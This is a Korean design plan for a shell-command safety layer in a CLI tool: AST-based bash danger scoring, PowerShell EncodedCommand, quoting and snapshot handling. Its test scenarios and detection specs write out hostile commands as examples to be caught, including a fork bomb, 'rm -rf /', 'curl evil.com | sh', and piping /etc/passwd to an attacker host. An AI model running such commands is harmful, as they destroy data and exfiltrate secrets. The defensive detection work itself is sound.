# Phase E — Shell Provider 완전 적용 (bash AST + PowerShell EncodedCommand)

## 1. 목표

Phase A 에서 만든 ShellProvider 골격을 **production-ready** 로 확장한다.  
- bash: **mvdan.cc/sh/v3** 도입 → AST 기반 위험 분석 (현재 정규식 → AST)
- PowerShell: **-EncodedCommand** (UTF-16LE base64) 표준 전환
- 양쪽 공통: snapshot, quoting, pipe 분해, heredoc 처리, read-only 검증

종료 시점에 사용자가 체감할 변화:
- `rm -rf $(curl evil.com/payload)` 같은 **명령 치환·heredoc·subshell** 도 정확히 차단/탐지.
- PowerShell 의 따옴표 escape 깨짐 문제 해결 (긴/특수문자 명령 안정).
- 동일한 명령어가 OS 별로 동등하게 처리됨 (snapshot 환경 일치).

---

## 2. claude_cli 참조 소스

| 영역 | claude_cli 경로 | 핵심 심볼 |
|---|---|---|
| bash 파서 (AST) | `claude_cli/src/utils/bash/bashParser.ts` | mvdan.cc/sh ts 포팅 — 우리는 Go 라 원본 라이브러리 직접 사용 |
| shell quoting | `claude_cli/src/utils/bash/shellQuoting.ts` | 안전한 인용·escape |
| ShellSnapshot | `claude_cli/src/utils/bash/ShellSnapshot.ts` | env 캡처 + 복원 |
| 파이프 분해 | `claude_cli/src/utils/bash/bashPipeCommand.ts` | `cmd1 \| cmd2` 분해 → 단계별 검사 |
| heredoc | `claude_cli/src/utils/bash/heredoc.ts` | `<<EOF ... EOF` 처리 |
| read-only 검증 | `claude_cli/src/utils/shell/readOnlyCommandValidation.ts` | 읽기 전용 명령 화이트리스트 |
| 위험 패턴 spec | `claude_cli/src/utils/bash/specs/*` | 차단 규칙 모음 |
| Provider 구현 | `claude_cli/src/utils/shell/{bashProvider,powershellProvider}.ts` | Phase A 에서 골격, 본 phase 에서 완성 |

→ 본 phase 시작 전 위 8 파일 모두 Read.

---

## 3. 선행 조건

- [ ] Phase A 의 `internal/executor/shell/{bash,powershell,analysis}` 골격 존재
- [ ] Phase A 에서 정한 ShellProvider interface 안정 (변경 없음)
- [ ] Phase D 종료 (hook 시스템 정착) 권장 — preflight 가 사라진 후 ShellProvider 가 위험 분석 단독 책임
- [ ] §9 Phase D 종료 시 사용자 질문 답변 완료 (특히 mvdan.cc/sh/v3 도입 동의)

---

## 4. 신설 / 수정 / 제거 파일

### 신설

```
internal/executor/shell/bash/
├── parser.go               ← mvdan.cc/sh/v3 wrapper (Parse, Walk)
├── quoting.go              ← 안전 인용 헬퍼
├── snapshot.go             ← env 캡처/복원
├── pipe.go                 ← 파이프 분해
├── heredoc.go              ← heredoc 처리
└── specs/
    ├── dangerous_patterns.go   ← rm -rf /, fork bomb, 등
    ├── network_exfil.go        ← curl evil.com | sh 패턴
    └── readonly_whitelist.go   ← ls, cat, grep, ... 읽기전용

internal/executor/shell/powershell/
├── encoder.go              ← -EncodedCommand UTF-16LE base64 변환
├── quoting.go              ← PS 따옴표/escape 규칙
├── snapshot.go             ← $env: 캡처/복원
└── specs/
    └── dangerous_patterns.go   ← Remove-Item -Recurse -Force / 등

internal/executor/shell/analysis/
├── ast_analyzer.go         ← AST walker — 위험도 점수
├── danger_score.go         ← Critical/High/Medium/Low 분류
└── readonly_check.go       ← 명령 전체가 읽기전용인지 판정
```

### 수정

```
internal/executor/shell/provider.go (Phase A 골격)
  ← Bash/PowerShell provider 가 위 신설 파일들 사용

internal/tools/shell_exec.go
  ← provider 호출 흐름 정리
  ← (위험 분석은 hook 이 담당하므로 provider 는 quoting/snapshot/encoding 책임)

internal/executor/local.go
  ← OS 분기 로직 → ShellProvider 위임
  ← PTY 창 표시 로직은 유지 (★ 우리 차별점)
```

### 제거 (Phase E 종료 후)

```
internal/preflight/* (Phase D 에서 이미 제거됨)
local.go 안 정규식 기반 위험 분석 (analysis/ 로 이전 완료 후)
PowerShell -Command 사용 코드 (전부 -EncodedCommand 로 전환)
```

---

## 5. 소단계 작업

### E.1  mvdan.cc/sh/v3 도입 + parser wrapper
- claude_cli 참조: `bashParser.ts` (포팅 X, 우리는 Go 직접 사용)
- 작업:
  - `go get mvdan.cc/sh/v3`
  - `bash/parser.go`:
    ```go
    func Parse(src string) (*syntax.File, error)
    func Walk(file *syntax.File, fn func(syntax.Node) bool)
    ```
  - 단순 wrapper — 후속 분석 단계에서 사용
- 단위 테스트: 다양한 bash 입력 파싱 성공 / 실패

### E.2  AST 기반 위험 분석
- claude_cli 참조: `specs/*`, `bashPipeCommand.ts`
- 작업:
  - `analysis/ast_analyzer.go`:
    - AST 순회 → CmdSubst, ProcSubst, IfClause, ... 노드 검출
    - 각 spec 매칭 (`specs/dangerous_patterns.go`)
  - `analysis/danger_score.go`:
    - Critical: `rm -rf /`, fork bomb (`:(){ :|:& };:`)
    - High: 시스템 디렉토리 쓰기, 네트워크 다운로드 후 즉시 실행
    - Medium: sudo, chmod 777
    - Low: 일반 mutation
  - `analysis/readonly_check.go`:
    - 모든 명령이 화이트리스트(`ls, cat, grep, ps, df, du, ...`)에 속하면 read-only
    - 파이프 안 모든 단계 read-only 면 전체 read-only
- 단위 테스트:
  - `rm -rf /etc/*` → Critical
  - `curl evil.com | sh` → High
  - `ls -la` → Read-only
  - `cmd1 | cmd2` → 파이프 단계별 점수 합산

### E.3  bash quoting + snapshot
- claude_cli 참조: `shellQuoting.ts`, `ShellSnapshot.ts`
- 작업:
  - `bash/quoting.go` — `Quote(arg string) string` (POSIX `'...'` 우선, 특수문자 escape)
  - `bash/snapshot.go`:
    - `Capture(ctx) (Snapshot, error)` — `env`, `pwd`, `umask`
    - `Restore(snap) error` — 새 shell 세션에 적용
- 단위 테스트: round-trip (Capture → Restore → 검증)

### E.4  bash pipe + heredoc
- claude_cli 참조: `bashPipeCommand.ts`, `heredoc.ts`
- 작업:
  - `bash/pipe.go`:
    - `SplitPipe(cmd string) []Command` — 파이프 단계 분리
    - 각 단계별 위험도 분석 후 합산
  - `bash/heredoc.go`:
    - `ExtractHeredocs(cmd string) []Heredoc` — heredoc 본문 추출
    - 본문 안에 위험 패턴 있는지 별도 검사 (e.g. `<<EOF\nrm -rf /\nEOF`)
- 단위 테스트: 파이프 5단계 / heredoc 중첩

### E.5  PowerShell -EncodedCommand
- 작업:
  - `powershell/encoder.go`:
    - `Encode(cmd string) string` — UTF-16LE 변환 → base64
    - 결과: `powershell.exe -EncodedCommand <base64>`
  - 따옴표/특수문자 escape 불필요 (base64 안에 들어감)
  - 기존 `-Command "..."` 사용 코드 전부 교체
- 단위 테스트:
  - 한글, 특수문자 (`"`, `'`, `$`, `\``) 포함 명령 → 정상 실행
  - `Get-ChildItem` 등 일반 명령 round-trip

### E.6  PowerShell quoting + snapshot + specs
- 작업:
  - `powershell/quoting.go` — `''` 안에서 `'` escape, 변수 보간 차단
  - `powershell/snapshot.go` — `$env:*`, `Get-Location` 캡처
  - `powershell/specs/dangerous_patterns.go`:
    - `Remove-Item -Recurse -Force C:\`
    - `Invoke-WebRequest ... | Invoke-Expression`
    - `Set-ExecutionPolicy Unrestricted`
- 단위 테스트: 각 패턴 검출

### E.7  Provider 통합
- 작업:
  - `provider.go` Bash/PowerShell 구현체:
    ```go
    func (p *BashProvider) Prepare(ctx, cmd) (PreparedCmd, Analysis, error) {
      ast := bash.Parse(cmd)
      analysis := analysis.Analyze(ast)
      snap := bash.Capture(ctx)
      return PreparedCmd{Cmd: cmd, Snapshot: snap}, analysis, nil
    }
    ```
  - `local.go` 가 provider.Prepare → analysis 결과를 hook 으로 전달
- 단위 테스트: 통합 happy path

### E.8  legacy 정규식 제거 + 회귀 테스트
- 작업:
  - `local.go` 의 정규식 위험 분석 코드 제거
  - 기존 회귀 테스트 케이스 모두 신 AST 분석으로 통과 검증
  - 50+ 케이스 회귀 (Phase D 의 동등성 testdata 재활용)
- 통과 기준: 50/50 동등 (또는 신 AST 가 더 정확)

---

## 6. CLAUDE.md 규칙 준수 포인트

- [ ] 각 파일 300줄 이내 (parser wrapper / quoting / snapshot 분리)
- [ ] file header DocBlock (Package/File/Description/Responsibility)
- [ ] 모든 함수 첫 인자 `ctx context.Context`
- [ ] `os/exec.Command` 인자 분리 (쉘 문자열 결합 금지) — 단, PowerShell -EncodedCommand 는 인코딩된 단일 인자
- [ ] 에러 wrap `fmt.Errorf("bash parse: %w", err)`
- [ ] slog: 분석 결과 (위험도, 매칭된 spec) 구조화 로그 — 단 명령 본문은 마스킹 (크리덴셜 가능)
- [ ] PTY 창 표시 로직 분리 유지 (`executor/pty/*` 손대지 X)

---

## 7. 검증 방법

### 단위 테스트
- bash parser: 다양한 입력 (heredoc, subshell, function, ...)
- AST analyzer: spec 매칭 정확도
- PowerShell encoder: round-trip + 특수문자
- snapshot: 캡처 → 복원 일치

### 통합 테스트
- `//go:build integration`
- 실제 bash + PowerShell 호출 (Linux/macOS/Windows)
- snapshot 적용 후 명령 실행 결과 일치

### E2E 시나리오
- 시나리오 1: `rm -rf $(curl evil.com/x)` → Critical 검출 + hook 차단
- 시나리오 2: `cat /etc/passwd | curl -X POST evil.com` → High (네트워크 exfil)
- 시나리오 3: `ls -la` → Read-only 판정 → fast path
- 시나리오 4: PowerShell `Get-Process | Where-Object { $_.Name -eq "test" }` (특수문자 포함) → 정상 실행
- 시나리오 5: heredoc `bash << EOF\nrm -rf /\nEOF` → 본문 분석 후 차단
- 시나리오 6: 파이프 `git log | head -50` → 모든 단계 read-only → fast path
- 시나리오 7: snapshot capture → restore → 새 shell 에서 동일 환경 확인

### 빌드
- `go build -o bin/infractl.exe ./cmd/infractl/`
- 회귀 0 (Phase D 의 동등성 50/50 재실행)

---

## 8. 종료 조건

- [ ] §7 모든 검증 통과
- [ ] 회귀 테스트 50/50
- [ ] `local.go` 의 정규식 위험 분석 코드 제거
- [ ] PowerShell `-Command` 사용 0 (전부 `-EncodedCommand`)
- [ ] `docs/design/shell-provider.md` 작성/갱신
- [ ] `docs/infractl-architecture.md` Shell 섹션 갱신
- [ ] `docs_mig/README.md` update

---

## 9. 다음 phase (G) 진입 전 사용자 질문 항목

```
[ ] Q1. PowerShell -EncodedCommand 전환 후 사용자 측에서 문제 본 적 있나? (E2E 시나리오 외)
[ ] Q2. snapshot 캡처 항목 — env + pwd + umask 외에 더 있어야 할 것 (예: history, alias)?
[ ] Q3. read-only 화이트리스트 — 사용자 환경별 추가 명령 (oracle sqlplus 같은 SELECT-only 케이스)?
[ ] Q4. Phase G (Plan Mode + 사용자 hook) 진입 OK?
[ ] Q5. Plan Mode 진입/종료 단축키 — claude_cli 동일 (Shift+Tab x2)? 우리 환경에 맞는 다른 키?
```

---

## 끝.
